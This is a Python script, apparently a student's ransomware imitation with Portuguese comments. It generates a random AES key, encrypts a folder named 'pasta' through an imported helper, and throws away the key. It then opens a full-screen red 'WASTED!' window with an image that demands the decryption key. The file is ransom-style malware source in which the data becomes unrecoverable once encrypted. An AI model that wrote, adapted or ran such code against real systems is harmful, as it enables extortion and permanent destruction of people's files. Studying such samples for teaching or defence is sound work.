import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk  # Para carregar e exibir a imagem
from funcoes import encrypt_aes, decrypt_aes  # Certifique-se de que o nome do módulo está correto
import secrets
import string
import os

# Função para abrir a janela do tkinter
def abrir_janela():
    global janela  # Definir a janela como global para poder ser fechada posteriormente
    # Criar a janela do tkinter
    janela = tk.Tk()
    janela.title("Mensagem Secreta")
    janela.geometry("1920x1080")

    # Definir o fundo da janela como vermelho
    janela.configure(bg='red')
    
    # Abrir a janela em modo tela cheia
    janela.state('zoomed')  # AQUI: Configuração para iniciar em tela cheia
    
    # Exibir a mensagem "SE FODEU!" no centro, bem grande, com texto em preto
    label_mensagem = tk.Label(janela, text="WASTED!", font=("Arial", 80), fg="black", bg="red")
    label_mensagem.pack(pady=20)
    
    # Campo de entrada para a senha do usuário, com fundo vermelho e texto preto
    global entrada_chave
    label_chave = tk.Label(janela, text="Insira a chave para descriptografar:", font=("Arial", 20), fg="black", bg="red")
    label_chave.pack()
    entrada_chave = tk.Entry(janela, width=50, show="*", fg="black", bg="lightgray", font=("Arial", 14))
    entrada_chave.pack(pady=10)
    
    # Botão para enviar a senha e tentar descriptografar, com texto preto e fundo cinza
    botao_descriptografar = tk.Button(janela, text="Descriptografar", command=descriptografar_texto, fg="black", bg="gray", font=("Arial", 14))
    botao_descriptografar.pack(pady=10)
    
    # Carregar a imagem usando Pillow
    img = Image.open(R"C:\Users\nicko\OneDrive\Área de Trabalho\FIAP\Projetos\VsCode - Python\Projetos\sistema-cript\image.jpg")  # Certifique-se de que a imagem "imagem.png" está no mesmo diretório
    img = img.resize((500, 250), Image.Resampling.LANCZOS)  # Ajusta o tamanho da imagem
    img_tk = ImageTk.PhotoImage(img)

    # Adicionar a imagem na parte inferior da tela
    label_imagem = tk.Label(janela, image=img_tk, bg='red')
    label_imagem.image = img_tk  # Manter a referência da imagem para evitar coleta de lixo
    label_imagem.pack(side="bottom", pady=10)

    # Iniciar o loop do tkinter
    janela.mainloop()

# Função para descriptografar dados usando o método decrypt_aes
def descriptografar_texto():
    chave_usuario = entrada_chave.get().encode('utf-8')  # Obtém a chave digitada pelo usuário e converte para bytes
    try:
        # Chama a função de descriptografia com a chave fornecida
        decrypt_aes('pasta', chave_usuario)
        messagebox.showinfo("Sucesso", "Descriptografia concluída com sucesso!")
        
        # Fechar a janela após a descriptografia bem-sucedida
        janela.destroy()
    except Exception as e:
        messagebox.showerror("Erro", f"Erro ao descriptografar: {str(e)}")

# Exemplo de uso do encrypt_aes
if __name__ == "__main__":
    # Definir os comprimentos possíveis para a senha
    comprimentos_possiveis = [16, 24, 32]
    tamanho = secrets.choice(comprimentos_possiveis)

    # Definir os caracteres permitidos (letras, números e símbolos)
    caracteres = string.ascii_letters + string.digits + string.punctuation

    # Gerar a senha aleatória
    key = ''.join(secrets.choice(caracteres) for _ in range(tamanho)).encode('utf-8')

    # Realizar a criptografia na pasta 'pasta' (mesma pasta para criptografia e descriptografia)
    encrypt_aes('pasta', key)

    # Após a criptografia, abrir a janela do tkinter
    abrir_janela()
